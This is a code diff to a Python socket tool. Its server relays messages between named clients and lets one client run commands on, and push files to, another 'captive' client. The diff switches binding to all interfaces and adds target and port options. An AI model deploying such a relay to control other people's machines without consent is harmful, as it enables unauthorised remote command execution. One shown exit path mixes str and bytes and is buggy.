@@ -26,7 +26,7 @@ startText = """
  [*] Ready.
 """
 
-def opDefiner(data):
+def opDefiner(clients, data):
     op = data.split()[1].strip()
     opSocket = clients.get(op)
     return op, opSocket
@@ -64,7 +64,6 @@ def client_listener(client, username):
     buffer = b""
     while True:
         data = client.recv(4096)
-        print("DATA: ", data)
 
         if not data:
             break
@@ -136,7 +135,7 @@ def client_listener(client, username):
                         if not chunk:
                             raise ConnectionError("Client disconnected during CMD_OUTPUT")
                         buffer += chunk
-                    vip, vipSocket = opDefiner(buffer.decode("UTF-8", errors="ignore"))
+                    vip, vipSocket = opDefiner(clients, buffer.decode("UTF-8", errors="ignore"))
 
                     cmd_buffer = buffer[:buffer.find(ankor)+len(ankor)]
                     buffer = buffer[buffer.find(ankor)+len(ankor):]
@@ -153,7 +152,7 @@ def client_listener(client, username):
 
                 cmd = buffer.split(b"\n", 2)[0].decode()
                 try:
-                    captiveName, captive = opDefiner(cmd)
+                    captiveName, captive = opDefiner(clients, cmd)
             
                     if captive is None:
                         client.sendall(
@@ -176,7 +175,7 @@ def client_listener(client, username):
             elif buffer.startswith(b"run"):
                 try:
                     cmd = buffer.split(b"\n", 2)[0].decode("UTF-8", errors="ignore").strip()
-                    captiveName, captive = opDefiner(cmd)
+                    captiveName, captive = opDefiner(clients, cmd)
                     commandEx = cmd.split(" ", 2)[2].strip()
 
                     if not captive:
@@ -207,7 +206,7 @@ def client_listener(client, username):
                 try:
                     cmd = buffer.split(b"\n", 2)[0].decode().strip() 
                     filename = cmd.split(" ")[3]
-                    captiveName, captive = opDefiner(cmd)
+                    captiveName, captive = opDefiner(clients, cmd)
                 except Exception as e:
                     print(e)
                     client.send("Please follow special command format!".encode("UTF-8"))
@@ -301,38 +300,43 @@ def receive_file(client, first_data, filename, file_size):
     return received
 
 def client_sender(name):
+    try:
 
-    while True:
-        if forbid_sending == False:
-            cmd = input(name)
-            if cmd == "":
-                continue
-            elif cmd == "exit":
-                cmd = cmd + "\n"
+        while True:
+            if forbid_sending == False:
+                cmd = input(name)
+                if cmd == "":
+                    continue
+                elif cmd == "exit":
+                    cmd = cmd + "\n"
+                    s.send(cmd.encode("UTF-8"))
+                    break
+
+                elif cmd.startswith("dataPush"):
+                    parts = cmd.split()
+
+                    if len(parts) < 3:
+                        print("Usage: dataPush <target> <filename>")
+                        continue
+
+                    op = parts[1]
+                    filename = parts[2]
+
+                    file_path = os.path.join(os.getcwd(), filename)
+
+                    if not os.path.isfile(file_path):
+                        print(f"File not found: {file_path}")
+                        continue
+
+                    transfer_file(op, file_path)
+                    continue
+
+                cmd = name + cmd + "\n"
                 s.send(cmd.encode("UTF-8"))
-                break
-
-            elif cmd.startswith("dataPush"):
-                parts = cmd.split()
-
-                if len(parts) < 3:
-                    print("Usage: dataPush <target> <filename>")
-                    continue
-
-                op = parts[1]
-                filename = parts[2]
-
-                file_path = os.path.join(os.getcwd(), filename)
-
-                if not os.path.isfile(file_path):
-                    print(f"File not found: {file_path}")
-                    continue
-
-                transfer_file(op, file_path)
-                continue
-            cmd = name + cmd + "\n"
-
-            s.send(cmd.encode("UTF-8"))
+    except KeyboardInterrupt as e:
+        print(Fore.GREEN + "\n\nProgramm successfully stopped" + Style.RESET_ALL)
+        s.send(name + "exit\n".encode("UTF-8"))
+        sys.exit(0)
 
 def receive_cmd_output(client, val):
     buffer = val.encode("UTF-8")
@@ -346,17 +350,16 @@ def receive_cmd_output(client, val):
 
             buffer += chunk
     return buffer.decode("UTF-8", errors="ignore")
+        
 
 
-def ClientListener():
+def ClientListener(name):
     global forbid_sending
     while True:
         try:
             buffer = s.recv(1024)
             data = buffer.decode("UTF-8", errors="ignore")
             
-            # print(Fore.GREEN + "DATA: " + data)
-
             if not buffer:
                 break
             if b"CMD_OUTPUT" in buffer:
@@ -447,7 +450,7 @@ def ClientListener():
                 continue
 
             if not "> " in data:
-                print(Fore.RED + f"\n[ALERT] Received ALERT from server: {data}" + Style.RESET_ALL)
+                print(Fore.RED + f"\n[ALERT] Received [ALERT] from server: {data}" + Style.RESET_ALL)
                 continue
 
             else:
@@ -463,6 +466,8 @@ def ClientListener():
 parser = argparse.ArgumentParser(add_help=False)
 parser.add_argument("--name", help="Initial buffer to send")
 parser.add_argument("-l", "--listen", action="store_true", help="Listen mode")
+parser.add_argument("-t", "--target", help="Specify Target")
+parser.add_argument("-p", "--port", help="Specify Port")
 parser.add_argument("-h", "--help", action="store_true", help="Show help")
 args = parser.parse_args()
 
@@ -502,51 +507,75 @@ if args.help == True:
 """ + Style.RESET_ALL)
     sys.exit(0)
 
-elif args.listen == True:
+port = args.port
+target = args.target
+
+if port == None:
+    print(Fore.RED + "[ALERT] Specify Port" + Style.RESET_ALL)
+    sys.exit(0)
+
+if args.listen == True:
 
     clients = {}
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(("localhost", 5000))
+    try:
+        s.bind(("0.0.0.0", int(port)))
+    except Exception as e:
+        print(Fore.RED + "[ALERT] Specify a real free port. " + Style.RESET_ALL)
+        print(e)
+        sys.exit(0)
                     
     s.listen(5)
 
+    print(Fore.BLUE + f"[MESSAGE] Server successfully started on {target} on port {port}\n" + Style.RESET_ALL)
+
     while True:
-        client, addr = s.accept()
-        username = client.recv(1024).decode("UTF-8", errors="ignore")  # Receive initial data from the client (e.g., username)
-        if username in clients:
-            client.send("Username already taken. Disconnecting.\n".encode("UTF-8"))
-            client.close()
-            continue
+        try:
+            client, addr = s.accept()
+            username = client.recv(1024).decode("UTF-8", errors="ignore")  # Receive initial data from the client (e.g., username)
+            if username in clients:
+                client.send("Username already taken. Disconnecting.\n".encode("UTF-8"))
+                client.close()
+                continue
 
-        clients[username] = client
+            clients[username] = client
 
-        print(f"Connection from {addr} has been established!")
+            print(Fore.BLUE+f"[ALERT] Connection from {addr} has been established!"+Style.RESET_ALL)
 
-        listener = threading.Thread(
-            target=client_listener,
-            args=(client, username),
-            daemon=True
-        )
+            listener = threading.Thread(
+                target=client_listener,
+                args=(client, username),
+                daemon=True
+            )
 
-        listener.start()
+            listener.start()
+        except KeyboardInterrupt as e:
+            print(Fore.GREEN + "\n\n[ALERT] Programm successfully stopped. "+ Style.RESET_ALL)
+            s.close()
+            sys.exit(0)
 
 else:
-
     if args.name == None or len(args.name)>20 or len(args.name)<4:
         print(Fore.RED + "[ALERT] Please provide a name using --name" + Style.RESET_ALL)
         sys.exit(0)
 
-    username = args.name + "> "
-
     global forbid_sending
     forbid_sending = False
+    username = args.name + "> "
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("localhost", 5000))
-    s.send(username.encode("UTF-8"))
+    target = args.target
+    if target == None:
+        print(Fore.RED + "[ALERT] Specify your target. "+ Style.RESET_ALL)
+        sys.exit(0)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, int(port)))
+        s.send(args.name.encode("UTF-8"))
+    except Exception as e:
+        print(e)
 
-    thread = threading.Thread(target=ClientListener)
+    thread = threading.Thread(target=ClientListener, args=(username,))
     thread2 = threading.Thread(target=client_sender, args=(username,))
     thread.start()
     thread2.start()
